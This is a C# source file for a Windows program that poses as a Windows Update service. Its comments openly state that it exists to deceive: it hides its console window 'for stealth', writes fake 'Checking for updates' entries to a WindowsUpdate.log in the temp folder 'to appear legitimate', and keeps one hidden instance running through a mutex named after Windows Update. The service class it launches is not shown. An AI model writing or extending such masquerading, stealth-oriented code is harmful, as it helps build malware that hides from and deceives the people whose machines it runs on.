using System;
using System.Threading;
using System.IO;
using System.Diagnostics;

internal static class Program
{
    private static Mutex? _mutex;
    
    static void Main()
    {
        // Ensure only one instance runs
        bool createdNew;
        _mutex = new Mutex(true, "WindowsUpdateServiceMutex", out createdNew);
        
        if (!createdNew)
        {
            return; // Another instance is already running
        }

        try
        {
            // Load environment variables
            LoadEnvironmentVariables();
            
            // Hide console window for stealth
            HideConsoleWindow();
            
            // Start the background service
            var service = new WindowsUpdateService();
            
            // Keep the service running
            while (true)
            {
                Thread.Sleep(5000); // Check every 5 seconds
                
                // Simulate legitimate Windows Update activity
                if (DateTime.Now.Minute % 10 == 0) // Every 10 minutes
                {
                    SimulateUpdateCheck();
                }
            }
        }
        finally
        {
            _mutex?.ReleaseMutex();
            _mutex?.Dispose();
        }
    }
    
    private static void LoadEnvironmentVariables()
    {
        try
        {
            string envFile = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, ".env");
            if (File.Exists(envFile))
            {
                var lines = File.ReadAllLines(envFile);
                foreach (var line in lines)
                {
                    if (string.IsNullOrWhiteSpace(line) || line.StartsWith("#"))
                        continue;
                        
                    var parts = line.Split('=', 2);
                    if (parts.Length == 2)
                    {
                        Environment.SetEnvironmentVariable(parts[0].Trim(), parts[1].Trim());
                    }
                }
            }
        }
        catch
        {
            // Silently handle env loading errors
        }
    }
    
    private static void HideConsoleWindow()
    {
        try
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0); // SW_HIDE = 0
        }
        catch
        {
            // Silently handle if can't hide console
        }
    }
    
    private static void SimulateUpdateCheck()
    {
        try
        {
            // Write to Windows Update log to appear legitimate
            string logPath = Path.Combine(Path.GetTempPath(), "WindowsUpdate.log");
            string logEntry = $"{DateTime.Now:yyyy-MM-dd HH:mm:ss} - Checking for updates...{Environment.NewLine}";
            File.AppendAllText(logPath, logEntry);
        }
        catch
        {
            // Silently handle logging errors
        }
    }
    
    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();
    
    [System.Runtime.InteropServices.DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}